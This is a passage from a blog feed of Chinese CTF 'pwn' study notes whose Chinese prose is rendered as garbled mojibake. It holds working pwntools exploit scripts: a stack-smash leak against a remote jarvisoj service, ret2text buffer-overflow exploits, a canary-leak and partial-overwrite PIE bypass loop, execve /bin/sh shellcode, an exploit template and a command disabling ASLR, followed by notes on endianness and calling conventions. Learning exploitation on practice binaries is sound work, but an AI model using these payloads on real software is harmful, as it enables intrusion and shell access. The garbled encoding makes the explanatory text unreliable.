ˆé¡¶ä½ç½®</h4><p>å…ˆçœ‹ä¸€ä¸‹getså‡½æ•°è°ƒç”¨çš„ä½ç½®ã€‚<br><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215214432.png" alt="Pasted image 20250215214432">å› ä¸ºåœ¨64ä½ç¨‹åºä¸­rdiå¯„å­˜å™¨ä¸­å­˜æ”¾çš„æ˜¯å½“å‰æ‰§è¡Œå‡½æ•°çš„ä¸€å‚ï¼Œæ‰€ä»¥å½“å‰çš„æ ˆé¡¶å°±æ˜¯getså‡½æ•°çš„ä¸€å‚ã€‚æ‰€ä»¥å½“å‰æ ˆé¡¶çš„ä½ç½®åˆ°åˆšæ‰çš„argv[0]çš„åç§»è·ç¦»å°±æ˜¯æˆ‘ä»¬çš„æº¢å‡ºé•¿åº¦ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡è®¡ç®—<br><code>0x7fffffffdbf8 - 0x7fffffffd9a0 = 0x218</code><br>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¾“å…¥å†…å®¹è¦åœ¨0x218ä»¥åæ‰èƒ½æŠŠargv[0]ç»™è¦†ç›–æ‰ï¼Œå¹¶ä¸”è¾“å…¥0x218ä¸ªå†…å®¹ä¹‹åæŠŠ0x00400d20å†™ä¸Šå°±å¯ä»¥äº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p=process(&#x27;./smashes&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;pwn.jarvisoj.com&#x27;</span>,<span class="number">9877</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x218</span>+p64(<span class="number">0x400d20</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name? &#x27;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;flag: &#x27;</span>,<span class="string">&#x27;hollk&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (p.recvall())</span><br></pre></td></tr></table></figure><p><img src="/2025/02/26/PWN%E6%8A%80%E5%B7%A7-%E7%BB%95%E8%BF%87Canary%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF%EF%BC%88%E5%BE%85%E5%A1%AB%E5%9D%91%EF%BC%89/Pasted image 20250215214432-1742920972819-16.png" alt="Pasted image 20250215214432"><br>Ubuntuç‰ˆæœ¬åŸå› (libc 2.27ä¹‹ååŠ äº†å…¶ä»–æœºåˆ¶)ï¼Œè¿œç¨‹å¯æ‰“é€šï¼Œæœ¬åœ°ä¸è¡Œ</p><h2 id="5-åŠ«æŒ-stack-chk-failå‡½æ•°"><a href="#5-åŠ«æŒ-stack-chk-failå‡½æ•°" class="headerlink" title="5. åŠ«æŒ__stack_chk_failå‡½æ•°"></a>5. åŠ«æŒ__stack_chk_failå‡½æ•°</h2>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ ˆ </tag>
            
            <tag> PWNæŠ€å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNæŠ€å·§-å…¶ä»–</title>
      <link href="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/"/>
      <url>/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¢åº“"><a href="#æ¢åº“" class="headerlink" title="æ¢åº“"></a>æ¢åº“</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">strings libc.so.6 | grep <span class="string">&#x27;ubuntu&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Ubuntu GLIBC 2.35-0ubuntu3.8</span></span><br><span class="line"><span class="comment">#Ubuntu GLIBC 2.23-0ubuntu11.3</span></span><br><span class="line">./download 2.23-0ubuntu11.3_amd64</span><br><span class="line">patchelf --set-interpreter /home/zechariah/glibc-all-in-one/libs/2.35-0ubuntu3.9_amd64/ld-linux-x86-64.so.2 filename</span><br><span class="line">patchelf --replace-needed libc.so.6 ./libc.so.6 filename    </span><br></pre></td></tr></table></figure><h1 id="Capstoneå­—èŠ‚ç è½¬æ±‡ç¼–ä»£ç "><a href="#Capstoneå­—èŠ‚ç è½¬æ±‡ç¼–ä»£ç " class="headerlink" title="Capstoneå­—èŠ‚ç è½¬æ±‡ç¼–ä»£ç "></a><strong>Capstoneå­—èŠ‚ç è½¬æ±‡ç¼–ä»£ç </strong></h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode_x86 = <span class="string">b&quot;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73&quot;</span></span><br><span class="line">shellcode_x86 += <span class="string">b&quot;\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0&quot;</span></span><br><span class="line">shellcode_x86 += <span class="string">b&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_32)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(shellcode_x86, <span class="number">0x00</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;0x%x:\t%s\t%s&quot;</span> %(i.address, i.mnemonic, i.op_str))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_32): åˆå§‹åŒ–ç±»ï¼Œç»™ä¸¤ä¸ªå‚æ•°ï¼ˆç¡¬ä»¶æ¶æ„å’Œç¡¬ä»¶æ¨¡å¼ï¼‰</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(shellcode, <span class="number">0x00</span>):  disasm åæ±‡ç¼–è¿™æ®µHEX, å®ƒçš„å‚æ•°æ˜¯shellcodeå’Œèµ·å§‹åœ°å€ã€‚</span><br><span class="line"><span class="built_in">print</span>(â€œ0x%x:\t%s\t%sâ€ %(i.address, i.mnemonic, i.op_str)):æ‰“å°åœ°å€å’Œæ“ä½œæ•°ã€‚</span><br></pre></td></tr></table></figure><h1 id="æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦-cyclic"><a href="#æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦-cyclic" class="headerlink" title="æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦(cyclic)"></a><strong>æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦(cyclic)</strong></h1><h2 id="åˆè¯•"><a href="#åˆè¯•" class="headerlink" title="åˆè¯•"></a>åˆè¯•</h2><p>checksecï¼Œ32ä½<br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122123732.png" alt="Pasted image 20250122123732"><br>æ‹–å…¥IDA<br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122123854.png" alt="Pasted image 20250122123854"><br>å®¹æ˜“å¼•èµ·æ ˆæº¢å‡ºçš„å‡½æ•°<code>gets</code><br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122123840.png" alt="Pasted image 20250122123840"><br>æ‰¾åˆ°åé—¨å‡½æ•°<br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122124119.png" alt="Pasted image 20250122124119"><br>åœ°å€ä¸º<code>0x804863A</code><br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122123911.png" alt="Pasted image 20250122123911"><br>å®Œæˆå¦‚ä¸‹expï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line">offset=<span class="number">104</span></span><br><span class="line">addr = <span class="number">0x804863A</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>* offset + p32(addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122124958.png" alt="Pasted image 20250122124958"><br>æ‰“ä¸é€š</p><h2 id="æ‰‹åŠ¨æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦"><a href="#æ‰‹åŠ¨æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦" class="headerlink" title="æ‰‹åŠ¨æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦"></a>æ‰‹åŠ¨æµ‹é‡å˜é‡æº¢å‡ºé•¿åº¦</h2><p>çŒœæµ‹ä¹Ÿè®¸æ˜¯IDAä¸­çš„å˜é‡æº¢å‡ºé•¿åº¦æ˜¯é”™è¯¯çš„<br>äºæ˜¯æˆ‘ä»¬æ‰‹åŠ¨æµ‹é‡</p><h3 id="å·¥å…·cyclicç”Ÿæˆå­—ç¬¦ä¸²"><a href="#å·¥å…·cyclicç”Ÿæˆå­—ç¬¦ä¸²" class="headerlink" title="å·¥å…·cyclicç”Ÿæˆå­—ç¬¦ä¸²"></a>å·¥å…·cyclicç”Ÿæˆå­—ç¬¦ä¸²</h3><p><code>cyclic 200</code>ç”Ÿæˆä¸€ä¸ªé•¿åº¦ä¸º200çš„å­—ç¬¦ä¸²<br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122130556.png" alt="Pasted image 20250122130556"></p><h3 id="gdbè°ƒè¯•"><a href="#gdbè°ƒè¯•" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h3><p><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122130859.png" alt="Pasted image 20250122130859"><br>æ®æ­¤å¯çŸ¥æœ€å…ˆæº¢å‡ºçš„éƒ¨åˆ†æ˜¯<code>0x62616164</code></p><h3 id="æŸ¥æ‰¾å¡«å……ç©ºæ ˆæ‰€éœ€é‡"><a href="#æŸ¥æ‰¾å¡«å……ç©ºæ ˆæ‰€éœ€é‡" class="headerlink" title="æŸ¥æ‰¾å¡«å……ç©ºæ ˆæ‰€éœ€é‡"></a>æŸ¥æ‰¾å¡«å……ç©ºæ ˆæ‰€éœ€é‡</h3><p><code>cyclic -l 0x62616164</code><br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122131009.png" alt="Pasted image 20250122131009"><br>å®é™…ä¸Šçš„offsetæ˜¯<code>112</code><br>ä¿®æ”¹expå¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&quot;./ret2text&quot;</span>)</span><br><span class="line">offset=<span class="number">112</span></span><br><span class="line">addr = <span class="number">0x804863A</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>* offset + p32(addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250122125055.png" alt="Pasted image 20250122125055"><br>æˆåŠŸgetshellï¼ï¼ï¼ï¼ï¼</p><h1 id="ç»•è¿‡PIEä¿æŠ¤-Partial-overwrite"><a href="#ç»•è¿‡PIEä¿æŠ¤-Partial-overwrite" class="headerlink" title="(ç»•è¿‡PIEä¿æŠ¤)Partial overwrite"></a><strong>(ç»•è¿‡PIEä¿æŠ¤)Partial overwrite</strong></h1><h2 id="æ ˆä¸Šçš„partial-overwrite"><a href="#æ ˆä¸Šçš„partial-overwrite" class="headerlink" title="æ ˆä¸Šçš„partial overwrite"></a>æ ˆä¸Šçš„partial overwrite</h2><p>æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ç¨‹åºå¼€å¯äº†PIEä¿æŠ¤æ—¶(PIEenabled)é«˜ä½çš„åœ°å€ä¼šå‘ç”ŸéšæœºåŒ–ï¼Œ<strong>ä½†ä½ä½çš„åç§»æ˜¯å§‹ç»ˆå›ºå®šçš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬èƒ½æ›´æ”¹ä½ä½çš„åç§»ï¼Œå°±å¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµï¼Œç»•è¿‡PIEä¿æŠ¤</strong>ã€‚</p><blockquote><p>partial overwriteä¸ä»…ä»…å¯ä»¥ç”¨åœ¨æ ˆä¸Šï¼ŒåŒæ ·å¯ä»¥ç”¨åœ¨å…¶å®ƒéšæœºåŒ–çš„åœºæ™¯ã€‚æ¯”å¦‚å †çš„éšæœºåŒ–ï¼Œç”±äºå †èµ·å§‹åœ°å€ä½å­—èŠ‚ä¸€å®šæ˜¯0x00ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è¦†ç›–ä½ä½æ¥æ§åˆ¶å †ä¸Šçš„åç§»ã€‚</p></blockquote><h2 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h2><blockquote><p>æ— æ³•æ‹¿åˆ°é™„ä»¶ï¼Œæœ¬ä¾‹æœªç»è¿‡æœ¬äººå¤ç°ï¼Œä»…æ‘˜å½•</p></blockquote><p><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250217212716-1742921186249-29.png" alt="Pasted image 20250217212716"><br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250217212727.png" alt="Pasted image 20250217212727"><br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250217212740.png" alt="Pasted image 20250217212740"><br><img src="/2025/02/25/PWN%E6%8A%80%E5%B7%A7-%E5%85%B6%E4%BB%96/Pasted image 20250217212923.png" alt="Pasted image 20250217212923"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#  context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;deepin-terminal&quot;</span>, <span class="string">&quot;-x&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io = process(<span class="string">&quot;./babypie&quot;</span>, timeout = <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#  gdb.attach(io)</span></span><br><span class="line">        io.sendafter(<span class="string">b&quot;:\n&quot;</span>, <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x8</span> + <span class="number">1</span>))</span><br><span class="line">        io.recvuntil(<span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x8</span> + <span class="number">1</span>))</span><br><span class="line">        canary = <span class="string">b&#x27;\0&#x27;</span> + io.recvn(<span class="number">7</span>)</span><br><span class="line">        success(canary.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#  gdb.attach(io)</span></span><br><span class="line">        io.sendafter(<span class="string">b&quot;:\n&quot;</span>, <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x30</span> - <span class="number">0x8</span>) + canary + <span class="string">b&#x27;bbbbbbbb&#x27;</span> + <span class="string">b&#x27;\x3E\x0A&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="built_in">print</span> ï¼ˆeï¼‰</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> PWNæŠ€å·§ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€èˆ¬æµç¨‹ä¸expæ¿å­</title>
      <link href="/2025/02/25/%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B%E4%B8%8Eexp%E6%9D%BF%E5%AD%90/"/>
      <url>/2025/02/25/%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B%E4%B8%8Eexp%E6%9D%BF%E5%AD%90/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€èˆ¬æµç¨‹"><a href="#ä¸€èˆ¬æµç¨‹" class="headerlink" title="ä¸€èˆ¬æµç¨‹"></a>ä¸€èˆ¬æµç¨‹</h2><p>chmod u+x<br>checksec<br><code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</code><br><code>sudo vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other</code></p><p><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit">Chromium OS Docs - Linux System Call Table</a></p><p>æ³„éœ²libc<br><a href="https://libc.blukat.me/">libc database search</a></p><p>ç³»ç»Ÿè°ƒç”¨<br><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit">Chromium OS Docs - Linux System Call Table</a><br>é€ŸæŸ¥æºç <br><a href="https://elixir.bootlin.com/glibc/glibc-2.41.9000/source">Glibc source code (glibc-2.41.9000) - Bootlin Elixir Cross Referencer</a></p><h2 id="ç¼–å†™exp"><a href="#ç¼–å†™exp" class="headerlink" title="ç¼–å†™exp"></a>ç¼–å†™exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./&#x27;</span>) </span><br><span class="line">p=remote(<span class="string">&#x27;ip&#x27;</span>,port)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#==================================================================== </span></span><br><span class="line">li = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\\x1b[0m&#x27;</span>) </span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\\x1b[0m&#x27;</span>) </span><br><span class="line">s = <span class="keyword">lambda</span> s : p.send(s) </span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s) </span><br><span class="line">sa = <span class="keyword">lambda</span> n,s : p.sendafter(n,s) </span><br><span class="line">sla = <span class="keyword">lambda</span> n,s : p.sendlineafter(n,s) </span><br><span class="line">r = <span class="keyword">lambda</span> n : p.recv(n) </span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline() </span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s) </span><br><span class="line">ra = <span class="keyword">lambda</span> : p.recvall() </span><br><span class="line">ia = <span class="keyword">lambda</span> : p.interactive() </span><br><span class="line">uu32 = <span class="keyword">lambda</span> data : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\\x00&#x27;</span>)) </span><br><span class="line">uu64 = <span class="keyword">lambda</span> data : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\\x00&#x27;</span>)) </span><br><span class="line"><span class="comment"># u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;)) </span></span><br><span class="line"><span class="comment"># u32(p.recvuntil(b&#x27;\\xf7&#x27;)) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">g</span>(): </span><br><span class="line">    gdb.attach(p) </span><br><span class="line">    pause() </span><br><span class="line"><span class="comment">#==================================================================== </span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNåŸºç¡€-æ±‡ç¼–ï¼ˆå­—èŠ‚åºå¯„å­˜å™¨-ä¼ å‚-æŒ‡ä»¤é€ŸæŸ¥ï¼‰</title>
      <link href="/2025/02/23/PWN%E5%9F%BA%E7%A1%80-%E6%B1%87%E7%BC%96%EF%BC%88%E5%AF%84%E5%AD%98%E5%99%A8-%E4%BC%A0%E5%8F%82-%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5%EF%BC%89/"/>
      <url>/2025/02/23/PWN%E5%9F%BA%E7%A1%80-%E6%B1%87%E7%BC%96%EF%BC%88%E5%AF%84%E5%AD%98%E5%99%A8-%E4%BC%A0%E5%8F%82-%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h2><h2 id="å­—èŠ‚åº"><a href="#å­—èŠ‚åº" class="headerlink" title="å­—èŠ‚åº"></a>å­—èŠ‚åº</h2><p>åˆç§° <strong>ç«¯åº</strong> æˆ– <strong>å°¾åº</strong>ï¼ˆè‹±è¯­ä¸­ç”¨å•è¯ï¼š<strong>Endianness</strong> è¡¨ç¤ºï¼‰ã€‚åœ¨è®¡ç®—æœºé¢†åŸŸä¸­ï¼ŒæŒ‡ç”µè„‘å†…å­˜ä¸­ <strong>å ç”¨å¤šä¸ªå­—èŠ‚çš„æ•°æ®çš„å­—èŠ‚</strong> åœ¨ <strong>å†…å­˜ä¸­çš„æ’åˆ—é¡ºåº</strong>ã€‚</p><ul><li>å¤§ç«¯åºï¼ˆBig-Endianï¼‰å°†æ•°æ®çš„ä½ä½å­—èŠ‚å­˜æ”¾åœ¨å†…å­˜çš„é«˜ä½åœ°å€ï¼Œé«˜ä½å­—èŠ‚å­˜æ”¾åœ¨ä½ä½åœ°å€ã€‚è¿™ç§æ’åˆ—æ–¹å¼ä¸æ•°æ®ç”¨å­—èŠ‚è¡¨ç¤ºæ—¶çš„ä¹¦å†™é¡ºåºä¸€è‡´ï¼Œç¬¦åˆäººç±»çš„é˜…è¯»ä¹ æƒ¯ã€‚</li><li>å°ç«¯åºï¼ˆLittle-Endianï¼‰ï¼Œå°†ä¸€ä¸ªå¤šä½æ•°çš„ä½ä½æ”¾åœ¨è¾ƒå°çš„åœ°å€å¤„ï¼Œé«˜ä½æ”¾åœ¨è¾ƒå¤§çš„åœ°å€å¤„ï¼Œåˆ™ç§°å°ç«¯åºã€‚å°ç«¯åºä¸äººç±»çš„é˜…è¯»ä¹ æƒ¯ç›¸åï¼Œä½†æ›´ç¬¦åˆè®¡ç®—æœºè¯»å–å†…å­˜çš„æ–¹å¼ï¼Œå› ä¸ºCPUè¯»å–å†…å­˜ä¸­çš„æ•°æ®æ—¶ï¼Œæ˜¯ä»ä½åœ°å€å‘é«˜åœ°å€æ–¹å‘è¿›è¡Œè¯»å–çš„ã€‚</li></ul><p><img src="/2025/02/23/PWN%E5%9F%BA%E7%A1%80-%E6%B1%87%E7%BC%96%EF%BC%88%E5%AF%84%E5%AD%98%E5%99%A8-%E4%BC%A0%E5%8F%82-%E6%8C%87%E4%BB%A4%E9%80%9F%E6%9F%A5%EF%BC%89/image-20250327202035913.png" alt="image-20250327202035913"></p><ul><li>ä¸ºä»€ä¹ˆä¼šæœ‰å­—èŠ‚åºï¼Œç»Ÿä¸€ç”¨å¤§ç«¯åºä¸è¡Œå—ï¼Ÿç­”æ¡ˆæ˜¯ï¼Œè®¡ç®—æœºç”µè·¯å…ˆå¤„ç†ä½ä½å­—èŠ‚ï¼Œæ•ˆç‡æ¯”è¾ƒé«˜ï¼Œå› ä¸ºè®¡ç®—éƒ½æ˜¯ä»ä½ä½å¼€å§‹çš„ã€‚æ‰€ä»¥ï¼Œ<strong>è®¡ç®—æœºçš„å†…éƒ¨å¤„ç†éƒ½æ˜¯å°ç«¯å­—èŠ‚åºã€‚åœ¨è®¡ç®—æœºå†…éƒ¨ï¼Œå°ç«¯åºè¢«å¹¿æ³›åº”ç”¨äºç°ä»£ CPU å†…éƒ¨å­˜å‚¨æ•°æ®ï¼›è€Œåœ¨å…¶ä»–åœºæ™¯ï¼Œæ¯”å¦‚ç½‘ç»œä¼ è¾“å’Œæ–‡ä»¶å­˜å‚¨åˆ™ä½¿ç”¨å¤§ç«¯åº</strong>ã€‚å†…å­˜ä¸­çš„å¤šå­—èŠ‚æ•°æ®ç›¸å¯¹äºå†…å­˜åœ°å€æœ‰å¤§ç«¯å’Œå°ç«¯ä¹‹åˆ† ï¼Œ ç£ç›˜æ–‡ä»¶ä¸­çš„å¤šå­—èŠ‚æ•°æ®ç›¸å¯¹äºæ–‡ä»¶ä¸­çš„åç§»åœ°å€ä¹Ÿæœ‰å¤§ç«¯å°ç«¯ä¹‹åˆ† ã€‚ ç½‘ç»œæ•°æ®æµåŒæ ·æœ‰å¤§ç«¯å°ç«¯ä¹‹åˆ† ï¼Œ ä¹Ÿå°±æ˜¯è¯´,å½“æ¥æ”¶ç«¯æ”¶åˆ°ç¬¬ä¸€ä¸ªå­—èŠ‚çš„æ—¶å€™ï¼Œå®ƒå°†è¿™ä¸ªå­—èŠ‚ä½œä¸ºé«˜ä½å­—èŠ‚è¿˜æ˜¯ä½ä½å­—èŠ‚å¤„ç†</li></ul><blockquote><p><strong>å¯¹äºä¸€ä¸²æ•°æ®ï¼Œè§£ææœ‰ä¸¤ç§æ–¹æ³•ï¼šç¼“å†²åŒºï¼Œæˆ–è€…æµã€‚</strong></p><ul><li>ç½‘ç»œæ•°æ®æµçš„åœ°å€åº”è¿™æ ·è§„å®šï¼šå…ˆå‘å‡ºçš„æ•°æ®æ˜¯ä½åœ°å€ ï¼Œ åå‘å‡ºçš„æ•°æ®æ˜¯é«˜åœ°å€ã€‚</li><li>TCP/IPåè®®è§„å®šï¼šæŠŠæ¥æ”¶åˆ°çš„ç¬¬ä¸€ä¸ªå­—èŠ‚å½“ä½œé«˜ä½å­—èŠ‚çœ‹å¾… ï¼Œ å› æ­¤ç½‘ç»œæ•°æ®æµåº”é‡‡ç”¨å¤§ç«¯å­—èŠ‚åº ï¼Œ å³ä½åœ°å€é«˜å­—èŠ‚ã€‚<br>ä¸ºä»€ä¹ˆè¿™æ ·å®šï¼Œåˆå§‹å®šä¹‰è€…çš„é€‰æ‹©è€Œå·²ã€‚å®šä¸‹æ¥ä¾¿æˆä¸ºé“å¾‹ã€‚<br>ç½‘ç»œå­—èŠ‚åºä¸ºä»€ä¹ˆä½¿ç”¨å¤§ç«¯å­—èŠ‚åºï¼š<a href="https://www.zhihu.com/question/458844566" title="https://www.zhihu.com/question/458844566">https://www.zhihu.com/question/458844566</a></li></ul></blockquote><h2 id="ä¼ å‚æ–¹å¼"><a href="#ä¼ å‚æ–¹å¼" class="headerlink" title="ä¼ å‚æ–¹å¼"></a>ä¼ å‚æ–¹å¼</h2><h3 id="64ä½æ–‡ä»¶çš„ä¼ å‚æ–¹å¼"><a href="#64ä½æ–‡ä»¶çš„ä¼ å‚æ–¹å¼" class="headerlink" title="64ä½æ–‡ä»¶çš„ä¼ å‚æ–¹å¼"></a>64ä½æ–‡ä»¶çš„ä¼ å‚æ–¹å¼</h3><p>åœ¨64ä½ç³»ç»Ÿä¸­ï¼Œåœ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œå…¶å‰å…­ä¸ªå‚æ•°æ˜¯åœ¨rdi,rsi,rdx,rcx,r8,r9ä¸­å–<br>å½“å‚æ•°å°‘äº7ä¸ªæ—¶ï¼Œ å‚æ•°ä»å·¦åˆ°å³æ”¾å…¥å¯„å­˜å™¨: <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>, <code>r8</code>, <code>r9</code>ã€‚<br>å½“å‚æ•°ä¸º7ä¸ªä»¥ä¸Šæ—¶ï¼Œ å‰ 6 ä¸ªä¸å‰é¢ä¸€æ ·ï¼Œ ä½†åé¢çš„ä¾æ¬¡ä» â€œå³å‘å·¦â€ æ”¾å…¥æ ˆä¸­ï¼Œå³å’Œ32ä½æ±‡ç¼–ä¸€æ ·ã€‚<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">å‚æ•°ä¸ªæ•°å¤§äº <span class="number">7</span> ä¸ªçš„æ—¶å€™  